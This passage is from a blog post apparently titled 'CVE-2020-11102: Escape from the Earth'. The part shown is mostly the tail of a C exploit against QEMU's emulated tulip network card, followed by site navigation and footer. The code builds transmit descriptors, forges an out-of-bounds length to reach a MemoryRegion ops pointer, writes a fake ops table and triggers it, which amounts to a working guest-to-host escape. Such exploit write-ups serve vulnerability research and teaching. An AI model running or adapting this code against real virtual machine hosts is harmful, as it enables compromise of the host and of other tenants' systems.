class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">8</span>] = <span class="number">0x0000000400000004</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">        </span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x2a28</span><span class="number">-0x70</span>;  <span class="comment">// now points to the MemoryRegion.ops</span></span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] hijack ops\n&quot;</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *fake_memory_region_ops = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        fake_memory_region_ops[<span class="number">0</span>] = frame_base;</span><br><span class="line">        len1 = <span class="number">8</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(fake_memory_region_ops);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// trigger the ops.write</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-11102: Escape from the Earth</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">The vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-something-first"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leak something first</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Exploitation</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&text=CVE-2020-11102: Escape from the Earth"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&is_video=false&description=CVE-2020-11102: Escape from the Earth"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2020-11102: Escape from the Earth&body=Check out this article: https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&title=CVE-2020-11102: Escape from the Earth"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&name=CVE-2020-11102: Escape from the Earth&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/&t=CVE-2020-11102: Escape from the Earth"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
